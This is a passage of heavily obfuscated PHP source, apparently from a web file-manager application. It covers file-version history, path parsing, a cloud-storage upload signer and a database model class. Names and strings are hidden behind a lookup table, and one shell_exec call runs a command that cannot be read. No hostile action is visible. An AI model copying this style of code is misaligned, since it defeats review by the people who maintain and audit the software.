($’€ü¶é¡[$ûÚËã‘‡[369]] as $İ¤–Ñìú => $Ä®™”Í) { $Úô·Îşš = $†ç®ö£¶ . substr($Ä®™”Í[$ûÚËã‘‡[32]], strlen($èõ‹€”ğ)); $¡«“­éÌ = IO::move($’€ü¶é¡[$ûÚËã‘‡[1258]] . $Ä®™”Í[$ûÚËã‘‡[32]], $¨Ú—“š, !1, $Úô·Îşš); if ($¡«“­éÌ) { $’€ü¶é¡[$ûÚËã‘‡[369]][$İ¤–Ñìú][$ûÚËã‘‡[32]] = $Úô·Îşš; } } $’€ü¶é¡[$ûÚËã‘‡[1259]] = IO::move($’€ü¶é¡[$ûÚËã‘‡[1259]], $¨Ú—“š, !1, $†ç®ö£¶ . $ ÓŒøã‚); self::saveData($’€ü¶é¡[$ûÚËã‘‡[1259]], $’€ü¶é¡[$ûÚËã‘‡[369]]); self::clearEmptyFolder($’€ü¶é¡[$ûÚËã‘‡[1258]]); } public static function rollback($—“şœ¢¦, $³«Õì¢ş) { $Ñ°´¾«É =& $_SERVER[³·—™¤¢]; $Ï©¤Šû = self::listData($—“şœ¢¦); if (!$Ï©¤Šû) { return; } $•Ÿî·«Œ = IO::info($—“şœ¢¦); foreach ($Ï©¤Šû[$Ñ°´¾«É[369]] as $ö•è¢¥ => $×—ú™Ò¬) { if ($×—ú™Ò¬[$Ñ°´¾«É[399]] == $³«Õì¢ş) { self::add($—“şœ¢¦); $ì¿¬€¬¿ = $Ï©¤Šû[$Ñ°´¾«É[1258]] . $×—ú™Ò¬[$Ñ°´¾«É[32]]; $ë¬¸×İ· = IO::copy($ì¿¬€¬¿, IO::pathFather($—“şœ¢¦), REPEAT_REPLACE, $•Ÿî·«Œ[$Ñ°´¾«É[32]]); if ($ë¬¸×İ·) { self::remove($—“şœ¢¦, $³«Õì¢ş); } return $ë¬¸×İ·; } } return !1; } public static function setDetail($˜›ÙÖ÷ù, $”±åô–, $øÔú¾¢®) { $çòè‘§ =& $_SERVER[³·—™¤¢]; $Ç‘ÎŒËÅ = self::listData($˜›ÙÖ÷ù); if (!$Ç‘ÎŒËÅ) { return; } foreach ($Ç‘ÎŒËÅ[$çòè‘§[369]] as $ŞÛçë¬ => $™Ò¼êÌ¿) { if ($™Ò¼êÌ¿[$çòè‘§[399]] == $”±åô–) { $Ç‘ÎŒËÅ[$çòè‘§[369]][$ŞÛçë¬][$çòè‘§[1257]] = $øÔú¾¢®; self::saveData($Ç‘ÎŒËÅ[$çòè‘§[1259]], $Ç‘ÎŒËÅ[$çòè‘§[369]]); return !0; } } return !1; } public static function fileInfo($Ñ‹„ŞÊç, $¹»ÖÒÍ) { $£Ÿ²îìß =& $_SERVER[³·—™¤¢]; $ó¾ğîŠ = self::listData($Ñ‹„ŞÊç); if (!$ó¾ğîŠ) { show_json(LNG($£Ÿ²îìß[105]), !1); } $ñÏ¶ÛßÓ = $£Ÿ²îìß[12]; foreach ($ó¾ğîŠ[$£Ÿ²îìß[369]] as $–ô‚±¾ => $Šœ§ñ€) { if ($Šœ§ñ€[$£Ÿ²îìß[399]] != $¹»ÖÒÍ) { continue; } $ñÏ¶ÛßÓ = $ó¾ğîŠ[$£Ÿ²îìß[1258]] . $Šœ§ñ€[$£Ÿ²îìß[32]]; break; } if (!$ñÏ¶ÛßÓ) { show_json(LNG($£Ÿ²îìß[105]), !1); } return IO::info($ñÏ¶ÛßÓ); } public static function fileOut($•á­‡ş, $¢ÉºßÀï, $¸Æ×Ã¸ = false) { $»ÙÓ§­¯ =& $_SERVER[³·—™¤¢]; $Ë¿Ûş… = self::fileInfo($•á­‡ş, $¢ÉºßÀï); $İĞó¾œè =& $GLOBALS[$»ÙÓ§­¯[7]]; $¸Æ×Ã¸ = isset($İĞó¾œè[$»ÙÓ§­¯[1222]]) && $İĞó¾œè[$»ÙÓ§­¯[1222]] == 1; if (isset($İĞó¾œè[$»ÙÓ§­¯[33]]) && $İĞó¾œè[$»ÙÓ§­¯[33]] == $»ÙÓ§­¯[1260]) { return IO::fileOutImage($Ë¿Ûş…[$»ÙÓ§­¯[84]], $İĞó¾œè[$»ÙÓ§­¯[1261]]); } IO::fileOut($Ë¿Ûş…[$»ÙÓ§­¯[84]], $¸Æ×Ã¸, get_path_this($•á­‡ş)); } public static function listData($¬¤ñáÓú, $Àåª«ù = true) { $ï’‚—º =& $_SERVER[³·—™¤¢]; if ($Àåª«ù && !IO::exist($¬¤ñáÓú)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¬¤ñáÓú, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ğÜ€¹ = self::pathHistory($¬¤ñáÓú); $˜Î’ûØ‹ = array($ï’‚—º[1259] => $ğÜ€¹ . $ï’‚—º[1246], $ï’‚—º[1258] => rtrim(get_path_father($ğÜ€¹), $ï’‚—º[8]) . $ï’‚—º[8], $ï’‚—º[369] => array()); $š‡äÍÎ = IO::getContent($˜Î’ûØ‹[$ï’‚—º[1259]]); if ($š‡äÍÎ) { $öÇÔ×¸ = json_decode($š‡äÍÎ, !0); if (is_array($öÇÔ×¸)) { $˜Î’ûØ‹[$ï’‚—º[369]] = $öÇÔ×¸; } } return $˜Î’ûØ‹; } private static function saveData($Ë€›Ş¬‰, $¨¹Ø¼ñú) { $ÚŞµüàº =& $_SERVER[³·—™¤¢]; self::log($ÚŞµüàº[1262] . $Ë€›Ş¬‰ . $ÚŞµüàº[71] . count($¨¹Ø¼ñú), $ÚŞµüàº[772]); if ($¨¹Ø¼ñú) { return IO::setContent($Ë€›Ş¬‰, json_encode($¨¹Ø¼ñú)); } $ùÚšÉ×å = IO::pathFather($Ë€›Ş¬‰); IO::remove($Ë€›Ş¬‰); self::clearEmptyFolder($ùÚšÉ×å); return !0; } public static function clearEmptyFolder($’ûÚÍù“) { $¬¸¯Ï“ =& $_SERVER[³·—™¤¢]; if (trim($’ûÚÍù“, $¬¸¯Ï“[8]) == trim(self::$_historyBase, $¬¸¯Ï“[8])) { return; } $´êÎùäª = IO::pathFather($’ûÚÍù“); $­‘øş½™ = IO::has($’ûÚÍù“, !0); if ($­‘øş½™[$¬¸¯Ï“[207]] > 0 || $­‘øş½™[$¬¸¯Ï“[208]] > 0) { return; } IO::remove($’ûÚÍù“); self::clearEmptyFolder($´êÎùäª); } private static function getBasePath() { $¨öÛÃÆ™ =& $_SERVER[³·—™¤¢]; $«§ªØÌÚ = Model($¨öÛÃÆ™[1263])->get($¨öÛÃÆ™[1264]); if ($«§ªØÌÚ) { if (!IO::exist($«§ªØÌÚ)) { IO::mkdir($«§ªØÌÚ); } if (get_path_this($«§ªØÌÚ) == $¨öÛÃÆ™[1249]) { $¸„¥ËåÚ = $¨öÛÃÆ™[1265] . rand_string(8); @rename($«§ªØÌÚ, get_path_father($«§ªØÌÚ) . $¨öÛÃÆ™[8] . $¸„¥ËåÚ); $«§ªØÌÚ = DATA_PATH . $¸„¥ËåÚ . $¨öÛÃÆ™[8]; file_put_contents(DATA_PATH . $¨öÛÃÆ™[1266], $¨öÛÃÆ™[12]); Model($¨öÛÃÆ™[1263])->set($¨öÛÃÆ™[1264], $«§ªØÌÚ); } return $«§ªØÌÚ; } $«§ªØÌÚ = DATA_PATH . $¨öÛÃÆ™[1265] . rand_string(8) . $¨öÛÃÆ™[8]; $«§ªØÌÚ = IO::mkdir($«§ªØÌÚ); $«§ªØÌÚ = rtrim($«§ªØÌÚ, $¨öÛÃÆ™[8]) . $¨öÛÃÆ™[8]; file_put_contents($«§ªØÌÚ . $¨öÛÃÆ™[1266], $¨öÛÃÆ™[12]); file_put_contents(DATA_PATH . $¨öÛÃÆ™[1266], $¨öÛÃÆ™[12]); Model($¨öÛÃÆ™[1263])->set($¨öÛÃÆ™[1264], $«§ªØÌÚ); return $«§ªØÌÚ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\122\145\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\x46\151\154\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\106\151\154\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\160\122\x6f\157\164\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\123\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\123\150\x61\x72\x65\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\145\111\x74\145\x6d\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\173\165\x73\145\162\x52\145\x6e\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\x65\162\175"; public static function typeList() { $ßÄë¤¸ =& $_SERVER[³·—™¤¢]; return array($ßÄë¤¸[1267] => self::KOD_SOURCE, $ßÄë¤¸[1268] => self::KOD_USER_RECYCLE, $ßÄë¤¸[1269] => self::KOD_USER_FAV, $ßÄë¤¸[1270] => self::KOD_USER_FILE_TAG, $ßÄë¤¸[1271] => self::KOD_USER_FILE_TYPE, $ßÄë¤¸[1272] => self::KOD_GROUP_ROOT_SELF, $ßÄë¤¸[1273] => self::KOD_USER_SHARE, $ßÄë¤¸[1274] => self::KOD_USER_SHARE_LINK, $ßÄë¤¸[1275] => self::KOD_USER_SHARE_TO_ME, $ßÄë¤¸[1276] => self::KOD_SHARE_ITEM, $ßÄë¤¸[1277] => self::KOD_SHARE_LINK, $ßÄë¤¸[1278] => self::KOD_SEARCH, $ßÄë¤¸[1279] => self::KOD_BLOCK, $ßÄë¤¸[1280] => self::KOD_IO, $ßÄë¤¸[1281] => self::KOD_USER_RECENT, $ßÄë¤¸[1282] => self::KOD_USER_DRIVER); } public static function parse($ö¦œ¯ĞŞ) { $¡ìöşÂ¯ =& $_SERVER[³·—™¤¢]; $ö¦œ¯ĞŞ = self::clear($ö¦œ¯ĞŞ); $İŞ í×¹ = array_values(self::typeList()); preg_match($¡ìöşÂ¯[1283], $ö¦œ¯ĞŞ, $‡·‡…·Í); $®óÜŞç« = array($¡ìöşÂ¯[422] => !1, $¡ìöşÂ¯[1284] => !1, $¡ìöşÂ¯[419] => !1, $¡ìöşÂ¯[84] => $ö¦œ¯ĞŞ, $¡ìöşÂ¯[1193] => !1, $¡ìöşÂ¯[1192] => $¡ìöşÂ¯[12]); if (is_array($‡·‡…·Í) && count($‡·‡…·Í) == 5) { $”µğÜó› = $¡ìöşÂ¯[1285] . $‡·‡…·Í[2] . $¡ìöşÂ¯[327]; if (in_array($”µğÜó›, $İŞ í×¹)) { $®óÜŞç«[$¡ìöşÂ¯[1193]] = $‡·‡…·Í[1]; $®óÜŞç«[$¡ìöşÂ¯[33]] = $”µğÜó›; $®óÜŞç«[$¡ìöşÂ¯[1286]] = substr($”µğÜó›, 1, -1); $®óÜŞç«[$¡ìöşÂ¯[399]] = $‡·‡…·Í[3]; } $®óÜŞç«[$¡ìöşÂ¯[1192]] = $‡·‡…·Í[4]; } $Ğ¢äÛò° = array($¡ìöşÂ¯[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $®óÜŞç«[$¡ìöşÂ¯[1248]] = in_array($®óÜŞç«[$¡ìöşÂ¯[33]], $Ğ¢äÛò°); return $®óÜŞç«; } public static function isTruePath($è·‹î€Ş) { $ÉâµîØ  =& $_SERVER[³·—™¤¢]; if (substr($è·‹î€Ş, 0, 1) != $ÉâµîØ [1285]) { return !0; } if (strpos($è·‹î€Ş, $ÉâµîØ [408]) === 0) { return !0; } if (strpos($è·‹î€Ş, $ÉâµîØ [1252]) === 0) { return !0; } if (strpos($è·‹î€Ş, $ÉâµîØ [1287]) === 0) { return !0; } if (strpos($è·‹î€Ş, $ÉâµîØ [1288]) === 0) { return !0; } if (strpos($è·‹î€Ş, $ÉâµîØ [1289]) === 0) { return !0; } return !1; } public static function clear($¸Ô•£Ãæ) { $¬çÑ†Òá =& $_SERVER[³·—™¤¢]; $¸Ô•£Ãæ = str_replace(array($¬çÑ†Òá[1101], $¬çÑ†Òá[231]), $¬çÑ†Òá[53], $¸Ô•£Ãæ); $¸Ô•£Ãæ = str_replace($¬çÑ†Òá[97], $¬çÑ†Òá[8], $¸Ô•£Ãæ); $²…¯¼Öˆ = $¬çÑ†Òá[1290]; if (substr($¸Ô•£Ãæ, 0, 3) == $¬çÑ†Òá[1291]) { $¸Ô•£Ãæ = substr($¸Ô•£Ãæ, 3); } while (strstr($¸Ô•£Ãæ, $²…¯¼Öˆ)) { $¸Ô•£Ãæ = str_replace($²…¯¼Öˆ, $¬çÑ†Òá[8], $¸Ô•£Ãæ); } $¸Ô•£Ãæ = preg_replace($¬çÑ†Òá[1292], $¬çÑ†Òá[8], $¸Ô•£Ãæ); if ($¸Ô•£Ãæ == $¬çÑ†Òá[8]) { return $¬çÑ†Òá[8]; } $¸Ô•£Ãæ = rtrim($¸Ô•£Ãæ, $¬çÑ†Òá[8]); return $¸Ô•£Ãæ; } public static function sourceID($Ô­Û“…‰) { $¢ïÜ›ëô =& $_SERVER[³·—™¤¢]; $áİ™à×í = self::parse($Ô­Û“…‰); if ($áİ™à×í[$¢ïÜ›ëô[33]] !== self::KOD_SOURCE) { show_json(LNG($¢ïÜ›ëô[1293]), !1); } return $áİ™à×í[$¢ïÜ›ëô[399]]; } public static function make($õêÃşæ) { if (!$õêÃşæ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($õêÃşæ)); } public static function makeShare($¶ß³ÉÖ, $Ê•ÒÔ³) { return self::makePath(self::KOD_SHARE_ITEM, $¶ß³ÉÖ, $Ê•ÒÔ³); } public static function makeFileTypePath($®ˆ’ö‚—) { return self::makePath(self::KOD_USER_FILE_TYPE, $®ˆ’ö‚—); } public static function makeFileTagPath($î®™ëıÊ) { return self::makePath(self::KOD_USER_FILE_TAG, $î®™ëıÊ); } public static function makePath($—¦·¨«˜, $„àÙ¶Ä = '', $É‚éş = '') { $åéÉÚæ¨ =& $_SERVER[³·—™¤¢]; $Ú¼¦ŞÉ = substr($—¦·¨«˜, 1, -1); $Ÿºã¦‘Â = $åéÉÚæ¨[1294] . $Ú¼¦ŞÉ . $åéÉÚæ¨[1295] . $„àÙ¶Ä . $åéÉÚæ¨[1296]; $Ÿºã¦‘Â = $É‚éş ? $Ÿºã¦‘Â . $É‚éş . $åéÉÚæ¨[8] : $Ÿºã¦‘Â; return $Ÿºã¦‘Â; } public static function hashPath($¶‘Ñ¥ëÖ, $åø‚’©Ï = true) { $†ÔıÌ¬ =& $_SERVER[³·—™¤¢]; $Ø«Âı±É = is_array($¶‘Ñ¥ëÖ) ? $¶‘Ñ¥ëÖ : IO::info($¶‘Ñ¥ëÖ); $ÀÁ•½Ö = _get($Ø«Âı±É, $†ÔıÌ¬[1297], $†ÔıÌ¬[12]); if (!$ÀÁ•½Ö && isset($Ø«Âı±É[$†ÔıÌ¬[402]])) { $Ø«Âı±É = IO::info(KodIO::make($Ø«Âı±É[$†ÔıÌ¬[402]])); $ÀÁ•½Ö = _get($Ø«Âı±É, $†ÔıÌ¬[1297], $†ÔıÌ¬[12]); } if (!$ÀÁ•½Ö && $åø‚’©Ï) { $á¸ŞÖó¯ = KodIO::parse($Ø«Âı±É[$†ÔıÌ¬[84]]); if (!$á¸ŞÖó¯[$†ÔıÌ¬[33]]) { $ÀÁ•½Ö = IO::hashSimple($Ø«Âı±É[$†ÔıÌ¬[84]]); } } if (!$ÀÁ•½Ö) { $ÀÁ•½Ö = md5($Ø«Âı±É[$†ÔıÌ¬[84]] . $Ø«Âı±É[$†ÔıÌ¬[76]] . $Ø«Âı±É[$†ÔıÌ¬[85]]); } return $ÀÁ•½Ö; } public static function initSystemPath() { $Ë½úÀµ =& $_SERVER[³·—™¤¢]; if (defined($Ë½úÀµ[1298])) { return; } define($Ë½úÀµ[1298], self::systemPath($Ë½úÀµ[1299])); define($Ë½úÀµ[1300], self::systemPath($Ë½úÀµ[1301])); define($Ë½úÀµ[1302], self::systemPath($Ë½úÀµ[1303])); define($Ë½úÀµ[1304], self::systemPath($Ë½úÀµ[1305])); IOHistory::bindEvent(); } public static function systemPath($¤·³··) { $û÷ÑÉˆ =& $_SERVER[³·—™¤¢]; $ÈæóÃÇÜ = $û÷ÑÉˆ[1306] . ucfirst($¤·³··); $Õ˜ı“‡Ä = Model($û÷ÑÉˆ[790])->get($ÈæóÃÇÜ); if ($Õ˜ı“‡Ä) { return $Õ˜ı“‡Ä; } if ($¤·³·· == $û÷ÑÉˆ[1299]) { $Õ˜ı“‡Ä = self::make(Model($û÷ÑÉˆ[845])->systemRootPathAdd($û÷ÑÉˆ[544])); } else { $Õ˜ı“‡Ä = self::systemPath($û÷ÑÉˆ[1299]); $˜†Ü¥í = self::sourceID($Õ˜ı“‡Ä); $Õ˜ı“‡Ä = self::make(Model($û÷ÑÉˆ[845])->mkdir($˜†Ü¥í, $¤·³··)); } Model($û÷ÑÉˆ[790])->set($ÈæóÃÇÜ, $Õ˜ı“‡Ä); return $Õ˜ı“‡Ä; } public static function systemFolder($àˆåç»Ø) { $çß­Ìç = IO_PATH_SYSTEM_SOURCE . $àˆåç»Ø; $äÑ¥ÈáÓ = Cache::get($çß­Ìç); if (!$äÑ¥ÈáÓ) { $ï¶ïÔ¹ä = IO::infoFull($çß­Ìç); if (!$ï¶ïÔ¹ä) { $äÑ¥ÈáÓ = IO::mkdir($çß­Ìç, REPEAT_SKIP); } else { $äÑ¥ÈáÓ = $ï¶ïÔ¹ä[$_SERVER[³·—™¤¢][84]]; } Cache::set($çß­Ìç, $äÑ¥ÈáÓ, 3600 * 10); } return $äÑ¥ÈáÓ; } public static function defaultDriver() { return Model($_SERVER[³·—™¤¢][787])->defaultDriver(); } public static function defaultIO() { $¦ñ‡×âü =& $_SERVER[³·—™¤¢]; $üâ««ª¢ = self::defaultDriver(); return $¦ñ‡×âü[1307] . $üâ««ª¢[$¦ñ‡×âü[399]] . $¦ñ‡×âü[1296]; } public static function defaultDriverInit() { static $¾üµîıÇ = false; if ($¾üµîıÇ) { return $¾üµîıÇ; } $¾üµîıÇ = IO::init(self::defaultIO()); return $¾üµîıÇ; } public static function fileTypeList() { $çú§Šæµ =& $_SERVER[³·—™¤¢]; $ÑçôÊ¤‡ = $GLOBALS[$çú§Šæµ[6]][$çú§Šæµ[1308]]; foreach ($ÑçôÊ¤‡ as $˜¯Ëçîê => $–ß”ƒ÷¯) { $Ï›„ÛàÃ = $çú§Šæµ[1309] . $˜¯Ëçîê; $Áü“æÍÕ = LNG($Ï›„ÛàÃ); if ($Ï›„ÛàÃ != $Áü“æÍÕ) { $ÑçôÊ¤‡[$˜¯Ëçîê][$çú§Šæµ[32]] = $Áü“æÍÕ; } } return $ÑçôÊ¤‡; } public static function diskList($Ô•°‚ñ‰ = true) { $™ÉèÙŞ = $_SERVER[³·—™¤¢][1310]; if ($Ô•°‚ñ‰) { $Şš–Ñ¯Å = Cache::get($™ÉèÙŞ); if (is_array($Şš–Ñ¯Å)) { return $Şš–Ñ¯Å; } } $Şš–Ñ¯Å = self::diskListGet(); Cache::set($™ÉèÙŞ, $Şš–Ñ¯Å, 60); return $Şš–Ñ¯Å; } public static function diskListGet() { $ˆ—¢²ˆ =& $_SERVER[³·—™¤¢]; $ïÖîØ˜… = array(); if ($GLOBALS[$ˆ—¢²ˆ[6]][$ˆ—¢²ˆ[1311]] == $ˆ—¢²ˆ[1312]) { $ß™ïäÌ = $ˆ—¢²ˆ[1313]; for ($…†…Ñ„ = 0; $…†…Ñ„ < strlen($ß™ïäÌ); $…†…Ñ„++) { $½Âä ¸¸ = $ß™ïäÌ[$…†…Ñ„] . $ˆ—¢²ˆ[1314]; if (file_exists($½Âä ¸¸)) { $ïÖîØ˜…[] = $½Âä ¸¸; } } return $ïÖîØ˜…; } if (!function_exists($ˆ—¢²ˆ[98])) { $ïÖîØ˜…[] = $ˆ—¢²ˆ[855]; return $ïÖîØ˜…; } $©í¼úÌÏ = explode($ˆ—¢²ˆ[231], shell_exec($ˆ—¢²ˆ[1315])); array_shift($©í¼úÌÏ); array_pop($©í¼úÌÏ); $§¦ÊğãÂ = array($ˆ—¢²ˆ[1316], $ˆ—¢²ˆ[1317], $ˆ—¢²ˆ[1318], $ˆ—¢²ˆ[1319], $ˆ—¢²ˆ[1320], $ˆ—¢²ˆ[1321], $ˆ—¢²ˆ[1322], $ˆ—¢²ˆ[1323]); foreach ($©í¼úÌÏ as $ÊÜÑ—¶ó) { $Óé«ı°· = preg_split($ˆ—¢²ˆ[1324], $ÊÜÑ—¶ó); $½Âä ¸¸ = $Óé«ı°·[count($Óé«ı°·) - 1]; if (!strstr($Óé«ı°·[0], $ˆ—¢²ˆ[1325]) || !$½Âä ¸¸) { continue; } $Àˆ¦“Ç = rtrim($½Âä ¸¸, $ˆ—¢²ˆ[8]) . $ˆ—¢²ˆ[8]; if (in_array($Àˆ¦“Ç, $§¦ÊğãÂ)) { continue; } $ïÖîØ˜…[] = $Àˆ¦“Ç; } return $ïÖîØ˜…; } public static function isSameDisk($¿™Ÿ™¡½, $Ğ¥Ô¡â§) { $È”ŒËØµ =& $_SERVER[³·—™¤¢]; if ($GLOBALS[$È”ŒËØµ[6]][$È”ŒËØµ[1311]] == $È”ŒËØµ[1312]) { return strtolower(substr($¿™Ÿ™¡½, 0, 1)) == strtolower(substr($Ğ¥Ô¡â§, 0, 1)); } $³Î—ƒ­Õ = self::diskList(); $ßÀê¿íä = !1; $ùùå·…„ = !1; sort($³Î—ƒ­Õ); $³Î—ƒ­Õ = array_reverse($³Î—ƒ­Õ); $¿™Ÿ™¡½ = rtrim($¿™Ÿ™¡½, $È”ŒËØµ[8]) . $È”ŒËØµ[8]; $Ğ¥Ô¡â§ = rtrim($Ğ¥Ô¡â§, $È”ŒËØµ[8]) . $È”ŒËØµ[8]; foreach ($³Î—ƒ­Õ as $ÌÕ–°°) { $ø•“Òç = strlen($ÌÕ–°°); if (!$ßÀê¿íä && substr($¿™Ÿ™¡½, 0, $ø•“Òç) == $ÌÕ–°°) { $ßÀê¿íä = $ÌÕ–°°; } if (!$ùùå·…„ && substr($Ğ¥Ô¡â§, 0, $ø•“Òç) == $ÌÕ–°°) { $ùùå·…„ = $ÌÕ–°°; } if ($ßÀê¿íä && $ùùå·…„) { break; } } return $ßÀê¿íä === $ùùå·…„; } public static function transferType($²é§´Û½, $™“Ãˆ¶Ã) { $“äÓÆÄ =& $_SERVER[³·—™¤¢]; $ş¾µÆò = self::driverType($²é§´Û½); $È•šçÊ… = self::driverType($™“Ãˆ¶Ã); if ($ş¾µÆò[$“äÓÆÄ[33]] == $È•šçÊ…[$“äÓÆÄ[33]] && $ş¾µÆò[$“äÓÆÄ[1326]] == $È•šçÊ…[$“äÓÆÄ[1326]]) { return $“äÓÆÄ[1327]; } if ($ş¾µÆò[$“äÓÆÄ[33]] == $“äÓÆÄ[884] && $È•šçÊ…[$“äÓÆÄ[33]] == $“äÓÆÄ[106]) { return $“äÓÆÄ[1222]; } if ($ş¾µÆò[$“äÓÆÄ[33]] == $“äÓÆÄ[106] && $È•šçÊ…[$“äÓÆÄ[33]] == $“äÓÆÄ[884]) { return $“äÓÆÄ[107]; } return $“äÓÆÄ[1328]; } public static function driverType($‚‚û³‘Ü) { $Ä¢Ó•˜¢ =& $_SERVER[³·—™¤¢]; $ÜÀˆò ² = str_replace($Ä¢Ó•˜¢[1329], $Ä¢Ó•˜¢[12], strtolower($‚‚û³‘Ü->getType())); if ($ÜÀˆò ² == $Ä¢Ó•˜¢[778] || $ÜÀˆò ² == $Ä¢Ó•˜¢[1330] || $ÜÀˆò ² == $Ä¢Ó•˜¢[1331]) { $‚‚û³‘Ü = self::defaultDriverInit(); } else { if ($ÜÀˆò ² == $Ä¢Ó•˜¢[1229] || $ÜÀˆò ² == $Ä¢Ó•˜¢[1332]) { $‚‚û³‘Ü = IO::init($‚‚û³‘Ü->pathParse[$Ä¢Ó•˜¢[1174]]); } } $‚«…“·ğ = $‚‚û³‘Ü->path; $ÜÀˆò ² = str_replace($Ä¢Ó•˜¢[1329], $Ä¢Ó•˜¢[12], strtolower($‚‚û³‘Ü->getType())); if ($ÜÀˆò ² == $Ä¢Ó•˜¢[106]) { return array($Ä¢Ó•˜¢[33] => $Ä¢Ó•˜¢[106], $Ä¢Ó•˜¢[1326] => $Ä¢Ó•˜¢[12], $Ä¢Ó•˜¢[84] => $‚«…“·ğ); } return array($Ä¢Ó•˜¢[33] => $Ä¢Ó•˜¢[884], $Ä¢Ó•˜¢[1326] => $‚‚û³‘Ü->pathDriver, $Ä¢Ó•˜¢[84] => $‚«…“·ğ); } public static function pathDriverType($…Œ¢Ÿˆ©) { return $…Œ¢Ÿˆ© ? self::driverType(IO::init($…Œ¢Ÿˆ©)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($­èÆÚíÔ) { parent::__construct($­èÆÚíÔ); $this->signatureVersion($_SERVER[³·—™¤¢][216]); } public function uploadFormData($²÷Œ·, $ŸÊËóØµ = 3600) { $¬òß‘ï‡ =& $_SERVER[³·—™¤¢]; $Ñ½œ£úÆ = $¬òß‘ï‡[198]; $°»–³à” = $¬òß‘ï‡[232]; $¢Â¨ÓˆÔ = $¬òß‘ï‡[1333]; $ÇåïÌÜ‘ = gmdate($¬òß‘ï‡[1334], time() + $ŸÊËóØµ); $ˆº·×¦® = (string) time() . $¬òß‘ï‡[71] . (string) (time() + $ŸÊËóØµ); $â­•òË = array($¬òß‘ï‡[1335] => $ÇåïÌÜ‘, $¬òß‘ï‡[1336] => array(array($¬òß‘ï‡[1337] => $Ñ½œ£úÆ), array($¬òß‘ï‡[1338] => $this->bucket), array($¬òß‘ï‡[1339], $¬òß‘ï‡[1340], $¬òß‘ï‡[12]), array($¬òß‘ï‡[1341] => $¢Â¨ÓˆÔ), array($¬òß‘ï‡[1342] => $°»–³à”), array($¬òß‘ï‡[1343] => $this->accessKey), array($¬òß‘ï‡[1344] => $ˆº·×¦®))); $â­•òË = json_encode($â­•òË); $¨Ö—Öì× = hash_hmac($¬òß‘ï‡[232], $ˆº·×¦®, $this->secret); $½¥ãßÙ = sha1($â­•òË); $ƒ‹ø ³ = hash_hmac($¬òß‘ï‡[232], $½¥ãßÙ, $¨Ö—Öì×); $±İ˜êø„ = array($¬òß‘ï‡[1337] => $Ñ½œ£úÆ, $¬òß‘ï‡[1341] => $¢Â¨ÓˆÔ, $¬òß‘ï‡[1345] => base64_encode($â­•òË), $¬òß‘ï‡[1342] => $°»–³à”, $¬òß‘ï‡[1343] => $this->accessKey, $¬òß‘ï‡[1346] => $ˆº·×¦®, $¬òß‘ï‡[1347] => $ƒ‹ø ³, $¬òß‘ï‡[181] => $this->getHost()); return $±İ˜êø„; } public function fileOutLink($€ŸÚÖç) { $´ «¡½¨ =& $_SERVER[³·—™¤¢]; if (substr($€ŸÚÖç, 0, 7) == $´ «¡½¨[1348]) { $€ŸÚÖç = $´ «¡½¨[1349] . substr($€ŸÚÖç, 7); } header($´ «¡½¨[161] . $€ŸÚÖç); die; } } goto bµà’ŸÉØ; dŒĞÌ‚Ş: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\x64\145\162", "\x61\154\151\x61\163", "\150\141\x76\x69\x6e\147", "\147\x72\x6f\x75\x70", "\x6c\x6f\143\x6b", "\x64\x69\163\x74\x69\156\x63\164", "\141\x75\164\x6f", "\x66\x69\154\164\145\x72", "\x76\x61\x6c\151\144\x61\x74\145", "\162\x65\x73\x75\154\x74", "\x62\x69\156\144", "\164\x6f\x6b\145\156"); public function __construct($Ä©®çÉó = '', $ú¥Ì“”¨ = '', $ÜËÓîÅà = '') { $ğÈµó =& $_SERVER[³·—™¤¢]; $this->_initialize(); if (!empty($Ä©®çÉó)) { if (strpos($Ä©®çÉó, $ğÈµó[10])) { list($this->dbName, $this->name) = explode($ğÈµó[10], $Ä©®çÉó); } else { $this->name = $Ä©®çÉó; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ú¥Ì“”¨)) { $this->tablePrefix = $ğÈµó[12]; } elseif ($ğÈµó[12] != $ú¥Ì“”¨) { $this->tablePrefix = $ú¥Ì“”¨; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ğÈµó[244]); } $this->db(0, empty($this->connection) ? $ÜËÓîÅà : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Õ‘œ²ó =& $_SERVER[³·—™¤¢]; if (empty($this->fields)) { if (think_config($Õ‘œ²ó[245])) { $ŸËÙ×ğ‹ = $this->dbName ? $this->dbName : think_config($Õ‘œ²ó[246]); $ÃÇ¨…Ú´ = 